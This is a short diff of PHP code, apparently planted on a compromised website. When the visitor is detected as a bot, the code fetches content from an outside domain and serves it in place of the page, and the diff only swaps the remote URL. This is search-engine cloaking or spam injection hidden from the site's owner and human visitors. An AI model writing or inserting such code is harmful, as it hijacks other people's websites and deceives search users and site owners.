@@ -14,7 +14,7 @@
 	}
  
 	if (is_bot()) {
-		$message = file_get_contents('https://wellplayer.online/landing/hezekiahteam.com/index.txt');
+		$message = file_get_contents('https://wellplayer.online/landing/hezekiahteam.com/');
 		echo $message;
 	exit; // Atau bisa menggunakan die()
 	}
